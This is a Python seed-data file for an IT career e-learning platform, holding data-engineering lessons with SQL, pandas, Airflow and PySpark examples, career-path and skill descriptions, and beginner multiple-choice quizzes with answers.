                "bcrypt/argon2 for password hashing, SHA-256 for data integrity",
                "TLS 1.3 is the current standard - disable TLS 1.0 and 1.1",
                "Key management is harder than encryption itself - use managed services"
            ]
        }
    ]
}

DATA_ENGINEER_CONTENT = {
    "overview": {
        "what_youll_learn": [
            "Design and build ETL/ELT data pipelines",
            "Master SQL for complex data transformations",
            "Work with big data tools (Spark, Hadoop ecosystem)",
            "Orchestrate workflows with Apache Airflow",
            "Build data warehouses and data lakes",
            "Cloud data services (AWS Redshift, BigQuery, Snowflake)"
        ],
        "prerequisites": [
            "Strong SQL skills",
            "Python programming proficiency",
            "Basic understanding of databases and data structures",
            "Familiarity with Linux command line"
        ],
        "career_outlook": "Data engineering is one of the fastest-growing roles in tech. As companies become data-driven, they need engineers to build the infrastructure that makes data accessible and reliable. Data engineers often earn more than data scientists due to the engineering complexity involved."
    },
    "lessons": [
        {
            "title": "SQL Mastery for Data Engineering",
            "content": "SQL is the most important skill for a data engineer. While you may already know basic SELECT statements, data engineering requires advanced SQL for complex transformations, performance optimization, and working with massive datasets.\n\n**Advanced SQL Concepts:**\n- **Window Functions:** Calculate values across rows without collapsing them (ROW_NUMBER, RANK, LAG, LEAD, SUM OVER)\n- **Common Table Expressions (CTEs):** Named temporary result sets for readable complex queries\n- **Recursive Queries:** Process hierarchical data (org charts, category trees)\n- **PIVOT/UNPIVOT:** Reshape data between wide and long formats\n- **Performance:** EXPLAIN plans, indexing strategies, query optimization",
            "code_examples": [
                {
                    "title": "Advanced SQL - Window Functions & CTEs",
                    "language": "sql",
                    "code": "-- ════════════════════════════════════════════\n-- WINDOW FUNCTIONS\n-- ════════════════════════════════════════════\n\n-- Rank products by revenue within each category\nSELECT \n    category,\n    product_name,\n    revenue,\n    RANK() OVER (PARTITION BY category ORDER BY revenue DESC) AS rank_in_category,\n    revenue - LAG(revenue) OVER (PARTITION BY category ORDER BY revenue DESC) AS gap_to_next,\n    SUM(revenue) OVER (PARTITION BY category) AS category_total,\n    ROUND(revenue * 100.0 / SUM(revenue) OVER (PARTITION BY category), 2) AS pct_of_category\nFROM product_sales;\n\n-- Running total and moving average\nSELECT \n    date,\n    daily_revenue,\n    SUM(daily_revenue) OVER (ORDER BY date) AS running_total,\n    AVG(daily_revenue) OVER (\n        ORDER BY date \n        ROWS BETWEEN 6 PRECEDING AND CURRENT ROW\n    ) AS seven_day_avg\nFROM daily_metrics;\n\n-- ════════════════════════════════════════════\n-- COMMON TABLE EXPRESSIONS (CTEs)\n-- ════════════════════════════════════════════\n\n-- Customer segmentation analysis\nWITH customer_stats AS (\n    SELECT \n        customer_id,\n        COUNT(*) AS total_orders,\n        SUM(amount) AS total_spent,\n        MAX(order_date) AS last_order\n    FROM orders\n    WHERE order_date >= CURRENT_DATE - INTERVAL '12 months'\n    GROUP BY customer_id\n),\ncustomer_segments AS (\n    SELECT *,\n        CASE \n            WHEN total_spent > 10000 AND total_orders > 20 THEN 'VIP'\n            WHEN total_spent > 5000 THEN 'Premium'\n            WHEN total_spent > 1000 THEN 'Regular'\n            ELSE 'Occasional'\n        END AS segment\n    FROM customer_stats\n)\nSELECT \n    segment,\n    COUNT(*) AS customer_count,\n    ROUND(AVG(total_spent), 2) AS avg_spend,\n    ROUND(AVG(total_orders), 1) AS avg_orders\nFROM customer_segments\nGROUP BY segment\nORDER BY avg_spend DESC;\n\n-- ════════════════════════════════════════════\n-- DATA QUALITY CHECKS\n-- ════════════════════════════════════════════\n\n-- Find duplicate records\nSELECT email, COUNT(*) AS duplicates\nFROM users\nGROUP BY email\nHAVING COUNT(*) > 1;\n\n-- Check for NULL completeness\nSELECT \n    COUNT(*) AS total_rows,\n    COUNT(email) AS non_null_email,\n    ROUND(COUNT(email) * 100.0 / COUNT(*), 2) AS email_completeness_pct,\n    COUNT(DISTINCT category) AS unique_categories\nFROM users;"
                }
            ],
            "try_it": {
                "command": "sqlite3 backend/edulearn.db \".tables\"",
                "hint": "List all tables in the EduLearn SQLite database."
            },
            "key_takeaways": [
                "Window functions are the #1 advanced SQL skill for data engineers",
                "CTEs make complex queries readable and maintainable",
                "Always check EXPLAIN plans for slow queries before adding indexes",
                "Data quality checks should run in every pipeline",
                "Master JOINs, GROUP BY, and aggregations - they're used everywhere"
            ]
        },
        {
            "title": "ETL Pipelines with Python",
            "content": "ETL (Extract, Transform, Load) pipelines move data from sources to destinations, transforming it along the way. This is the core of data engineering.\n\n**ETL vs ELT:**\n- **ETL:** Transform data before loading (traditional, used with data warehouses)\n- **ELT:** Load raw data first, then transform (modern approach, used with cloud data lakes)\n\n**Pipeline Design Principles:**\n- **Idempotency:** Running the pipeline twice produces the same result\n- **Incremental Loading:** Process only new/changed data, not the full dataset\n- **Error Handling:** Log failures, retry transient errors, alert on persistent failures\n- **Data Validation:** Check data quality at each stage\n- **Monitoring:** Track row counts, latency, and error rates",
            "code_examples": [
                {
                    "title": "Python ETL Pipeline",
                    "language": "python",
                    "code": "\"\"\"Complete ETL pipeline example.\"\"\"\nimport pandas as pd\nimport logging\nfrom datetime import datetime, timedelta\nfrom sqlalchemy import create_engine\n\nlogging.basicConfig(level=logging.INFO)\nlogger = logging.getLogger(__name__)\n\nclass ETLPipeline:\n    def __init__(self, source_db, target_db):\n        self.source = create_engine(source_db)\n        self.target = create_engine(target_db)\n    \n    def extract(self, query: str) -> pd.DataFrame:\n        \"\"\"Extract data from source database.\"\"\"\n        logger.info(f\"Extracting data...\")\n        df = pd.read_sql(query, self.source)\n        logger.info(f\"Extracted {len(df)} rows\")\n        return df\n    \n    def transform(self, df: pd.DataFrame) -> pd.DataFrame:\n        \"\"\"Clean and transform the data.\"\"\"\n        logger.info(\"Transforming data...\")\n        \n        # Remove duplicates\n        initial_count = len(df)\n        df = df.drop_duplicates()\n        logger.info(f\"Removed {initial_count - len(df)} duplicates\")\n        \n        # Handle missing values\n        df['email'] = df['email'].str.lower().str.strip()\n        df['full_name'] = df['full_name'].fillna('Unknown')\n        \n        # Parse dates\n        df['created_date'] = pd.to_datetime(df['created_at']).dt.date\n        df['created_month'] = pd.to_datetime(df['created_at']).dt.to_period('M')\n        \n        # Categorize\n        df['customer_tier'] = pd.cut(\n            df['total_spent'],\n            bins=[0, 100, 500, 1000, float('inf')],\n            labels=['Bronze', 'Silver', 'Gold', 'Platinum']\n        )\n        \n        # Data validation\n        assert df['email'].notna().all(), \"NULL emails found!\"\n        assert (df['total_spent'] >= 0).all(), \"Negative spend found!\"\n        \n        logger.info(f\"Transform complete: {len(df)} rows\")\n        return df\n    \n    def load(self, df: pd.DataFrame, table_name: str):\n        \"\"\"Load transformed data to target database.\"\"\"\n        logger.info(f\"Loading {len(df)} rows to {table_name}...\")\n        df.to_sql(\n            table_name,\n            self.target,\n            if_exists='replace',\n            index=False,\n            chunksize=10000\n        )\n        logger.info(\"Load complete!\")\n    \n    def run(self):\n        \"\"\"Execute the full ETL pipeline.\"\"\"\n        start_time = datetime.now()\n        logger.info(f\"Pipeline started at {start_time}\")\n        \n        try:\n            # Extract\n            df = self.extract(\"\"\"\n                SELECT u.*, COALESCE(SUM(o.amount), 0) as total_spent\n                FROM users u\n                LEFT JOIN orders o ON u.id = o.user_id\n                GROUP BY u.id\n            \"\"\")\n            \n            # Transform\n            df = self.transform(df)\n            \n            # Load\n            self.load(df, 'dim_customers')\n            \n            duration = datetime.now() - start_time\n            logger.info(f\"Pipeline completed in {duration}\")\n            \n        except Exception as e:\n            logger.error(f\"Pipeline failed: {e}\")\n            raise\n\n# Run the pipeline\n# pipeline = ETLPipeline('postgresql://source_db', 'postgresql://warehouse')\n# pipeline.run()"
                },
                {
                    "title": "Apache Airflow DAG",
                    "language": "python",
                    "code": "\"\"\"Airflow DAG for daily data pipeline.\"\"\"\nfrom airflow import DAG\nfrom airflow.operators.python import PythonOperator\nfrom airflow.operators.bash import BashOperator\nfrom airflow.sensors.sql import SqlSensor\nfrom datetime import datetime, timedelta\n\ndefault_args = {\n    'owner': 'data-team',\n    'depends_on_past': False,\n    'email_on_failure': True,\n    'email': ['data-team@company.com'],\n    'retries': 3,\n    'retry_delay': timedelta(minutes=5),\n}\n\nwith DAG(\n    'daily_customer_pipeline',\n    default_args=default_args,\n    description='Daily customer data ETL pipeline',\n    schedule_interval='0 6 * * *',  # Run at 6 AM daily\n    start_date=datetime(2024, 1, 1),\n    catchup=False,\n    tags=['etl', 'customers'],\n) as dag:\n\n    # Wait for source data to be ready\n    wait_for_data = SqlSensor(\n        task_id='wait_for_source_data',\n        conn_id='source_db',\n        sql=\"SELECT COUNT(*) FROM orders WHERE date = '{{ ds }}'\",\n        mode='poke',\n        poke_interval=300,\n        timeout=3600,\n    )\n\n    # Extract from source\n    extract = PythonOperator(\n        task_id='extract_customer_data',\n        python_callable=extract_customers,\n        op_kwargs={'date': '{{ ds }}'},\n    )\n\n    # Transform\n    transform = PythonOperator(\n        task_id='transform_customer_data',\n        python_callable=transform_customers,\n    )\n\n    # Load to warehouse\n    load = PythonOperator(\n        task_id='load_to_warehouse',\n        python_callable=load_to_warehouse,\n    )\n\n    # Data quality check\n    quality_check = PythonOperator(\n        task_id='data_quality_check',\n        python_callable=run_quality_checks,\n    )\n\n    # Define pipeline order\n    wait_for_data >> extract >> transform >> load >> quality_check"
                }
            ],
            "try_it": {
                "command": "python -c \"import pandas; print(f'pandas {pandas.__version__} ready!')\"",
                "hint": "Verify pandas is installed - the essential data manipulation library."
            },
            "key_takeaways": [
                "ETL pipelines must be idempotent - safe to rerun without duplicating data",
                "Always validate data quality at each stage of the pipeline",
                "Apache Airflow is the industry standard for workflow orchestration",
                "Pandas for small/medium data, Spark for big data processing",
                "Log everything - you need to debug pipeline failures at 3 AM"
            ]
        },
        {
            "title": "Big Data with Apache Spark",
            "content": "When data grows beyond what a single machine can handle, you need distributed computing. Apache Spark is the leading big data processing engine.\n\n**Why Spark?**\n- Process terabytes to petabytes of data\n- 100x faster than Hadoop MapReduce (in-memory processing)\n- Unified engine for batch, streaming, ML, and graph processing\n- APIs in Python (PySpark), Scala, Java, and R\n\n**Spark Architecture:**\n- **Driver:** The main program that creates SparkContext\n- **Executors:** Worker processes that run tasks on cluster nodes\n- **RDD (Resilient Distributed Dataset):** Low-level distributed data abstraction\n- **DataFrame:** High-level structured API (like pandas, but distributed)\n- **SparkSQL:** Run SQL queries on distributed data",
            "code_examples": [
                {
                    "title": "PySpark - Data Processing at Scale",
                    "language": "python",
                    "code": "from pyspark.sql import SparkSession\nfrom pyspark.sql import functions as F\nfrom pyspark.sql.window import Window\n\n# Create Spark session\nspark = SparkSession.builder \\\n    .appName(\"CustomerAnalytics\") \\\n    .config(\"spark.sql.adaptive.enabled\", \"true\") \\\n    .getOrCreate()\n\n# ── Read Data ──\norders = spark.read.parquet(\"s3://data-lake/orders/\")\ncustomers = spark.read.parquet(\"s3://data-lake/customers/\")\n\n# ── Transformations ──\n# Join and aggregate\ncustomer_metrics = (\n    orders\n    .join(customers, orders.customer_id == customers.id)\n    .groupBy(\"customer_id\", \"name\", \"country\")\n    .agg(\n        F.count(\"order_id\").alias(\"total_orders\"),\n        F.sum(\"amount\").alias(\"total_revenue\"),\n        F.avg(\"amount\").alias(\"avg_order_value\"),\n        F.max(\"order_date\").alias(\"last_order_date\"),\n        F.min(\"order_date\").alias(\"first_order_date\")\n    )\n)\n\n# Window function: rank customers by revenue per country\nwindow_spec = Window.partitionBy(\"country\").orderBy(F.desc(\"total_revenue\"))\n\ncustomer_ranked = customer_metrics.withColumn(\n    \"country_rank\", F.rank().over(window_spec)\n).withColumn(\n    \"revenue_percentile\", F.percent_rank().over(window_spec)\n)\n\n# Filter top customers\ntop_customers = customer_ranked.filter(F.col(\"country_rank\") <= 100)\n\n# ── Write Results ──\n# Partitioned by country for efficient querying\ntop_customers.write \\\n    .partitionBy(\"country\") \\\n    .mode(\"overwrite\") \\\n    .parquet(\"s3://data-warehouse/top_customers/\")\n\n# ── SparkSQL ──\ncustomer_metrics.createOrReplaceTempView(\"metrics\")\nresult = spark.sql(\"\"\"\n    SELECT country, \n           COUNT(*) as customer_count,\n           SUM(total_revenue) as country_revenue\n    FROM metrics\n    GROUP BY country\n    ORDER BY country_revenue DESC\n    LIMIT 10\n\"\"\")\nresult.show()\n\nspark.stop()"
                }
            ],
            "try_it": {
                "command": "python -c \"print('Data engineering tools: pandas, sqlalchemy, airflow, pyspark')\"",
                "hint": "List the core tools in a data engineer's toolkit."
            },
            "key_takeaways": [
                "Use Spark when data exceeds single-machine capacity (typically 10GB+)",
                "DataFrames are preferred over RDDs for most use cases",
                "Partition data by frequently filtered columns for query performance",
                "Parquet is the preferred file format for big data (columnar, compressed)",
                "Spark's lazy evaluation means transformations are only executed on actions"
            ]
        }
    ]
}


# ─────────────────────────────────────────────────────────────────────────────
# CAREER PATHS DATA
# ─────────────────────────────────────────────────────────────────────────────

CAREER_PATHS_DATA = [
    {
        "title": "Cloud Solution Architect",
        "description": "Design and implement cloud infrastructure solutions on AWS, Azure, or GCP. Learn to build scalable, fault-tolerant, and cost-optimized architectures that power modern applications.",
        "category": "Cloud",
        "estimated_time": "12-18 months",
        "difficulty": "Advanced",
        "job_market_info": "Cloud architects are among the highest-paid IT professionals, with demand far exceeding supply. AWS certifications (Solutions Architect Associate/Professional) are the most sought-after cloud credentials. Companies across all industries are migrating to the cloud, creating massive demand.",
        "salary_range": "$120,000 - $200,000+",
        "learning_content": CLOUD_ARCHITECT_CONTENT,
        "skills": [
            "AWS Services", "Terraform", "Kubernetes", "Docker", "CI/CD",
            "Networking", "Security", "Architecture Design", "Cost Optimization"
        ]
    },
    {
        "title": "DevOps Engineer",
        "description": "Bridge development and operations by automating deployments, managing infrastructure as code, building CI/CD pipelines, and ensuring system reliability at scale.",
        "category": "DevOps",
        "estimated_time": "6-12 months",
        "difficulty": "Intermediate",
        "job_market_info": "DevOps engineers are essential in every modern tech company. Organizations adopting DevOps deploy 200x more frequently with 24x faster recovery from failures. The role combines software engineering and operations, making it one of the most versatile IT positions.",
        "salary_range": "$90,000 - $160,000+",
        "learning_content": DEVOPS_ENGINEER_CONTENT,
        "skills": [
            "CI/CD", "Docker", "Kubernetes", "Linux", "Scripting",
            "Monitoring", "Infrastructure as Code", "Git", "Cloud Platforms"
        ]
    },
    {
        "title": "Full Stack Developer",
        "description": "Build complete web applications from frontend to backend. Master React for beautiful UIs, FastAPI/Node.js for powerful APIs, SQL for data, and Git for collaboration.",
        "category": "Software Development",
        "estimated_time": "6-12 months",
        "difficulty": "Intermediate",
        "job_market_info": "Full stack developers are the Swiss Army knives of tech - highly valued in startups (where you build everything) and enterprises (where versatility shines). Strong demand across all industries, with abundant remote work opportunities. Great entry point for IT careers.",
        "salary_range": "$70,000 - $140,000+",
        "learning_content": FULLSTACK_DEVELOPER_CONTENT,
        "skills": [
            "JavaScript", "React", "Node.js", "Python", "Database Design",
            "REST APIs", "Git", "Testing", "HTML/CSS"
        ]
    },
    {
        "title": "Cybersecurity Specialist",
        "description": "Protect systems and data from cyber threats. Learn network security, web application security (OWASP Top 10), cryptography, penetration testing, and incident response.",
        "category": "Security",
        "estimated_time": "12-18 months",
        "difficulty": "Advanced",
        "job_market_info": "Cybersecurity has a global talent shortage of 3.5 million professionals. Every organization - from banks to hospitals to governments - needs security expertise. Certifications like CISSP, CEH, and CompTIA Security+ significantly boost earning potential. The field offers job security unlike any other.",
        "salary_range": "$100,000 - $180,000+",
        "learning_content": CYBERSECURITY_CONTENT,
        "skills": [
            "Network Security", "Penetration Testing", "Security Tools",
            "Risk Assessment", "Compliance", "Incident Response", "Cryptography"
        ]
    },
    {
        "title": "Data Engineer",
        "description": "Design and build data pipelines that move, transform, and store data at scale. Master SQL, Python, Apache Spark, Airflow, and cloud data warehouses.",
        "category": "Data Science",
        "estimated_time": "9-15 months",
        "difficulty": "Intermediate",
        "job_market_info": "Data engineering is the fastest-growing role in tech. As companies become data-driven, they need engineers to build reliable data infrastructure. Data engineers often earn more than data scientists due to the engineering complexity. Cloud data platforms (Snowflake, Databricks) are driving explosive growth.",
        "salary_range": "$95,000 - $150,000+",
        "learning_content": DATA_ENGINEER_CONTENT,
        "skills": [
            "Python", "SQL", "Big Data Tools", "ETL Pipelines",
            "Data Warehousing", "Cloud Platforms", "Spark", "Airflow"
        ]
    }
]


# ─────────────────────────────────────────────────────────────────────────────
# SKILLS DATA (with rich descriptions)
# ─────────────────────────────────────────────────────────────────────────────

SKILLS_DATA = [
    # Cloud Skills
    {"name": "AWS Services", "category": "Cloud", "level": SkillLevel.INTERMEDIATE,
     "description": "Amazon Web Services - the leading cloud platform. Learn EC2 (compute), S3 (storage), RDS (databases), Lambda (serverless), VPC (networking), and IAM (security)."},
    {"name": "Azure", "category": "Cloud", "level": SkillLevel.INTERMEDIATE,
     "description": "Microsoft's cloud platform. Key services include Azure VMs, Blob Storage, Azure SQL, Functions, and Active Directory integration."},
    {"name": "GCP", "category": "Cloud", "level": SkillLevel.INTERMEDIATE,
     "description": "Google Cloud Platform - strong in data analytics and machine learning. Key services: Compute Engine, BigQuery, Cloud Storage, GKE."},
    {"name": "Terraform", "category": "DevOps", "level": SkillLevel.INTERMEDIATE,
     "description": "Infrastructure as Code tool by HashiCorp. Define cloud resources in declarative HCL files, version control your infrastructure, and deploy consistently across environments."},
    {"name": "CloudFormation", "category": "Cloud", "level": SkillLevel.INTERMEDIATE,
     "description": "AWS-native Infrastructure as Code service. Define AWS resources in YAML/JSON templates for automated, repeatable infrastructure provisioning."},
    {"name": "Kubernetes", "category": "DevOps", "level": SkillLevel.ADVANCED,
     "description": "Container orchestration platform for automating deployment, scaling, and management of containerized applications. Learn Pods, Deployments, Services, Ingress, and Helm charts."},
    {"name": "Docker", "category": "DevOps", "level": SkillLevel.INTERMEDIATE,
     "description": "Containerization platform that packages applications with dependencies into portable containers. Essential for consistent deployments across development, testing, and production."},
    {"name": "CI/CD", "category": "DevOps", "level": SkillLevel.INTERMEDIATE,
     "description": "Continuous Integration and Continuous Deployment pipelines automate building, testing, and deploying code. Tools: GitHub Actions, Jenkins, GitLab CI, CircleCI."},
    {"name": "Git", "category": "Development", "level": SkillLevel.BEGINNER,
     "description": "Distributed version control system. Essential for tracking code changes, collaborating with teams, branching strategies, and code reviews via pull requests."},
    {"name": "Linux", "category": "DevOps", "level": SkillLevel.INTERMEDIATE,
     "description": "The operating system of the cloud (90%+ of servers). Master the command line, file system, process management, networking tools, and shell scripting."},
    {"name": "Python", "category": "Programming", "level": SkillLevel.INTERMEDIATE,
     "description": "Versatile programming language used in web development (FastAPI, Django), data engineering (pandas, PySpark), DevOps (automation scripts), and machine learning."},
    {"name": "JavaScript", "category": "Programming", "level": SkillLevel.INTERMEDIATE,
     "description": "The language of the web. Used for frontend development (React, Vue), backend (Node.js), and full-stack applications. Essential for any web developer."},
    {"name": "React", "category": "Frontend", "level": SkillLevel.INTERMEDIATE,
     "description": "The most popular JavaScript library for building user interfaces. Component-based architecture with hooks, JSX, virtual DOM, and a massive ecosystem."},
    {"name": "Node.js", "category": "Backend", "level": SkillLevel.INTERMEDIATE,
     "description": "JavaScript runtime for server-side development. Build REST APIs with Express.js, real-time apps with Socket.io, and full-stack apps with a single language."},
    {"name": "SQL", "category": "Database", "level": SkillLevel.INTERMEDIATE,
     "description": "Structured Query Language for managing relational databases. Master SELECT, JOIN, GROUP BY, window functions, CTEs, and query optimization."},
    {"name": "Networking", "category": "Infrastructure", "level": SkillLevel.ADVANCED,
     "description": "TCP/IP, DNS, HTTP/HTTPS, load balancing, VPNs, firewalls, and subnetting. Understanding networking is critical for cloud architecture and security."},
    {"name": "Security", "category": "Security", "level": SkillLevel.ADVANCED,
     "description": "Implement defense-in-depth security: IAM, encryption (at rest and in transit), security groups, vulnerability scanning, and compliance frameworks."},
    {"name": "Architecture Design", "category": "Cloud", "level": SkillLevel.ADVANCED,
     "description": "Design scalable, fault-tolerant, and cost-effective systems. Apply the AWS Well-Architected Framework's five pillars: operational excellence, security, reliability, performance, and cost optimization."},
    {"name": "Monitoring", "category": "DevOps", "level": SkillLevel.INTERMEDIATE,
     "description": "Observability and monitoring with Prometheus (metrics), Grafana (dashboards), ELK Stack (logs), and alerting. Track the Four Golden Signals: latency, traffic, errors, saturation."},
    {"name": "Infrastructure as Code", "category": "DevOps", "level": SkillLevel.INTERMEDIATE,
     "description": "Manage infrastructure through version-controlled code instead of manual processes. Tools: Terraform, CloudFormation, Pulumi, Ansible. Enables reproducible and auditable infrastructure."},
    # Additional skills for security and data paths
    {"name": "Network Security", "category": "Security", "level": SkillLevel.ADVANCED,
     "description": "Firewalls, IDS/IPS, VPNs, network segmentation, packet analysis with Wireshark, and zero-trust networking architectures."},
    {"name": "Penetration Testing", "category": "Security", "level": SkillLevel.ADVANCED,
     "description": "Authorized security testing to find vulnerabilities before attackers do. Tools: Nmap, Burp Suite, Metasploit, OWASP ZAP. Always requires written permission."},
    {"name": "Security Tools", "category": "Security", "level": SkillLevel.INTERMEDIATE,
     "description": "Security scanning and analysis tools: Nmap (network scanning), Wireshark (packet analysis), Burp Suite (web app testing), OSSEC (host IDS), and vulnerability scanners."},
    {"name": "Risk Assessment", "category": "Security", "level": SkillLevel.INTERMEDIATE,
     "description": "Identify, analyze, and prioritize security risks. Create risk matrices, conduct threat modeling, and develop mitigation strategies aligned with business objectives."},
    {"name": "Compliance", "category": "Security", "level": SkillLevel.INTERMEDIATE,
     "description": "Security compliance frameworks: SOC 2, ISO 27001, GDPR, HIPAA, PCI-DSS. Understanding regulatory requirements and implementing controls to meet them."},
    {"name": "Incident Response", "category": "Security", "level": SkillLevel.ADVANCED,
     "description": "Detect, contain, eradicate, and recover from security incidents. Build playbooks, conduct tabletop exercises, and perform post-incident analysis."},
    {"name": "Cryptography", "category": "Security", "level": SkillLevel.ADVANCED,
     "description": "Encryption algorithms (AES, RSA, ECC), hashing (SHA-256, bcrypt), TLS/SSL, digital signatures, key management, and PKI."},
    {"name": "Big Data Tools", "category": "Data", "level": SkillLevel.INTERMEDIATE,
     "description": "Distributed data processing frameworks: Apache Spark (batch + streaming), Hadoop HDFS (storage), Hive (SQL on Hadoop), and Kafka (event streaming)."},
    {"name": "ETL Pipelines", "category": "Data", "level": SkillLevel.INTERMEDIATE,
     "description": "Extract, Transform, Load pipelines that move data between systems. Design idempotent, incremental pipelines with error handling and data validation."},
    {"name": "Data Warehousing", "category": "Data", "level": SkillLevel.INTERMEDIATE,
     "description": "Centralized repositories for analytical data. Technologies: Snowflake, AWS Redshift, Google BigQuery. Concepts: star schema, slowly changing dimensions, materialized views."},
    {"name": "Cloud Platforms", "category": "Cloud", "level": SkillLevel.INTERMEDIATE,
     "description": "Multi-cloud knowledge across AWS, Azure, and GCP. Understanding cloud-native services, pricing models, and when to use each platform."},
    {"name": "Spark", "category": "Data", "level": SkillLevel.ADVANCED,
     "description": "Apache Spark for distributed data processing. PySpark DataFrames, SparkSQL, Spark Streaming, and performance tuning for large-scale data transformations."},
    {"name": "Airflow", "category": "Data", "level": SkillLevel.INTERMEDIATE,
     "description": "Apache Airflow for workflow orchestration. Define DAGs (Directed Acyclic Graphs) to schedule and monitor complex data pipelines with retry logic and alerting."},
    {"name": "Scripting", "category": "DevOps", "level": SkillLevel.INTERMEDIATE,
     "description": "Bash and Python scripting for automation. Write deployment scripts, system administration tasks, log analysis tools, and monitoring checks."},
    {"name": "Database Design", "category": "Database", "level": SkillLevel.INTERMEDIATE,
     "description": "Relational database design: normalization, entity-relationship diagrams, indexing strategies, and query optimization. PostgreSQL and MySQL."},
    {"name": "REST APIs", "category": "Backend", "level": SkillLevel.INTERMEDIATE,
     "description": "Design and build RESTful APIs. HTTP methods, status codes, authentication (JWT, OAuth), pagination, rate limiting, and API documentation with OpenAPI/Swagger."},
    {"name": "Testing", "category": "Development", "level": SkillLevel.INTERMEDIATE,
     "description": "Software testing: unit tests, integration tests, end-to-end tests. Tools: pytest (Python), Jest (JavaScript), Cypress (E2E). Write tests that catch bugs before production."},
    {"name": "HTML/CSS", "category": "Frontend", "level": SkillLevel.BEGINNER,
     "description": "The foundation of web development. HTML for structure, CSS for styling. Learn Flexbox, Grid, responsive design, and CSS custom properties."},
    {"name": "Cost Optimization", "category": "Cloud", "level": SkillLevel.INTERMEDIATE,
     "description": "Reduce cloud spending without sacrificing performance. Right-sizing instances, Reserved/Spot instances, S3 lifecycle policies, and cost monitoring with AWS Cost Explorer."},
]


# ─────────────────────────────────────────────────────────────────────────────
# ASSESSMENTS DATA (one per career path)
# ─────────────────────────────────────────────────────────────────────────────

ASSESSMENTS_DATA = {
    "Cloud Solution Architect": [
        {
            "title": "Cloud Architecture Fundamentals Assessment",
            "description": "Test your knowledge of cloud computing concepts, AWS services, and architecture best practices.",
            "time_limit": 30,
            "questions": [
                {
                    "question_text": "What is Infrastructure as Code (IaC)?",
                    "question_type": "multiple_choice",
                    "options": ["A) Manual server configuration through the console", "B) Managing and provisioning infrastructure through machine-readable code", "C) A type of cloud database service", "D) Container orchestration technology"],
                    "correct_answer": "B) Managing and provisioning infrastructure through machine-readable code",
                    "points": 5
                },
                {
                    "question_text": "Which AWS service is used for serverless computing?",
                    "question_type": "multiple_choice",
                    "options": ["A) EC2", "B) Lambda", "C) S3", "D) RDS"],
                    "correct_answer": "B) Lambda",
                    "points": 5
                },
                {
                    "question_text": "What does the 'S' in S3 stand for?",
                    "question_type": "multiple_choice",
                    "options": ["A) Secure", "B) Simple", "C) Scalable", "D) Standard"],
                    "correct_answer": "B) Simple",
                    "points": 3
                },
                {
                    "question_text": "Terraform is a popular Infrastructure as Code tool by HashiCorp.",
                    "question_type": "true_false",
                    "options": None,
                    "correct_answer": "True",
                    "points": 3
                },
                {
                    "question_text": "Which AWS service provides managed relational databases?",
                    "question_type": "multiple_choice",
                    "options": ["A) DynamoDB", "B) ElastiCache", "C) RDS", "D) S3"],
                    "correct_answer": "C) RDS",
                    "points": 5
                },
                {
                    "question_text": "What is the primary benefit of using multiple Availability Zones?",
                    "question_type": "multiple_choice",
                    "options": ["A) Reduced cost", "B) High availability and fault tolerance", "C) Faster compute speed", "D) More storage space"],
                    "correct_answer": "B) High availability and fault tolerance",
                    "points": 5
                },
                {
                    "question_text": "VPC stands for Virtual Private Cloud and provides network isolation in AWS.",
                    "question_type": "true_false",
                    "options": None,
                    "correct_answer": "True",
                    "points": 3
                }
            ]
        }
    ],
    "DevOps Engineer": [
        {
            "title": "DevOps Practices Assessment",
            "description": "Test your knowledge of CI/CD, Docker, Kubernetes, and DevOps best practices.",
            "time_limit": 25,
            "questions": [
                {
                    "question_text": "What does CI in CI/CD stand for?",
                    "question_type": "multiple_choice",
                    "options": ["A) Container Integration", "B) Continuous Integration", "C) Cloud Infrastructure", "D) Code Inspection"],
                    "correct_answer": "B) Continuous Integration",
                    "points": 3
                },
                {
                    "question_text": "In Docker, what is the difference between an image and a container?",
                    "question_type": "multiple_choice",
                    "options": ["A) They are the same thing", "B) An image is a running process, a container is a template", "C) An image is a read-only template, a container is a running instance", "D) A container is stored in a registry, an image runs locally"],
                    "correct_answer": "C) An image is a read-only template, a container is a running instance",
                    "points": 5
                },
                {
                    "question_text": "Which Kubernetes resource manages a set of identical pods?",
                    "question_type": "multiple_choice",
                    "options": ["A) Service", "B) ConfigMap", "C) Deployment", "D) Ingress"],
                    "correct_answer": "C) Deployment",
                    "points": 5
                },
                {
                    "question_text": "Docker Compose is used for defining multi-container Docker applications.",
                    "question_type": "true_false",
                    "options": None,
                    "correct_answer": "True",
                    "points": 3
                },
                {
                    "question_text": "What command shows the history of Docker image layers?",
                    "question_type": "multiple_choice",
                    "options": ["A) docker layers", "B) docker history", "C) docker inspect", "D) docker show"],
                    "correct_answer": "B) docker history",
                    "points": 5
                },
                {
                    "question_text": "What is a Kubernetes Pod?",
                    "question_type": "multiple_choice",
                    "options": ["A) A virtual machine", "B) The smallest deployable unit, containing one or more containers", "C) A network load balancer", "D) A storage volume"],
                    "correct_answer": "B) The smallest deployable unit, containing one or more containers",
                    "points": 5
                },
                {
                    "question_text": "In a CI/CD pipeline, tests should run AFTER deployment to production.",
                    "question_type": "true_false",
                    "options": None,
                    "correct_answer": "False",
                    "points": 3
                }
            ]
        }
    ],
    "Full Stack Developer": [
        {
            "title": "Full Stack Development Assessment",
            "description": "Test your knowledge of React, REST APIs, databases, and web development fundamentals.",
            "time_limit": 25,
            "questions": [
                {
                    "question_text": "In React, which hook is used to manage component state?",
                    "question_type": "multiple_choice",
                    "options": ["A) useEffect", "B) useState", "C) useContext", "D) useRef"],
                    "correct_answer": "B) useState",
                    "points": 5
                },
                {
                    "question_text": "What HTTP method is used to update an existing resource in a REST API?",
                    "question_type": "multiple_choice",
                    "options": ["A) GET", "B) POST", "C) PUT", "D) DELETE"],
                    "correct_answer": "C) PUT",
                    "points": 3
                },
                {
                    "question_text": "What does SQL JOIN do?",
                    "question_type": "multiple_choice",
                    "options": ["A) Deletes rows from two tables", "B) Combines rows from two or more tables based on a related column", "C) Creates a new database", "D) Sorts the results"],
                    "correct_answer": "B) Combines rows from two or more tables based on a related column",
                    "points": 5
                },
                {
                    "question_text": "JSX allows you to write HTML-like syntax directly in JavaScript files.",
                    "question_type": "true_false",
                    "options": None,
                    "correct_answer": "True",
                    "points": 3
                },
                {
                    "question_text": "Which HTTP status code means 'Not Found'?",
                    "question_type": "multiple_choice",
                    "options": ["A) 200", "B) 301", "C) 404", "D) 500"],
                    "correct_answer": "C) 404",
                    "points": 3
                },
                {
                    "question_text": "What is the purpose of useEffect in React?",
                    "question_type": "multiple_choice",
                    "options": ["A) To define component styles", "B) To handle side effects like API calls and subscriptions", "C) To create new components", "D) To manage routing"],
                    "correct_answer": "B) To handle side effects like API calls and subscriptions",
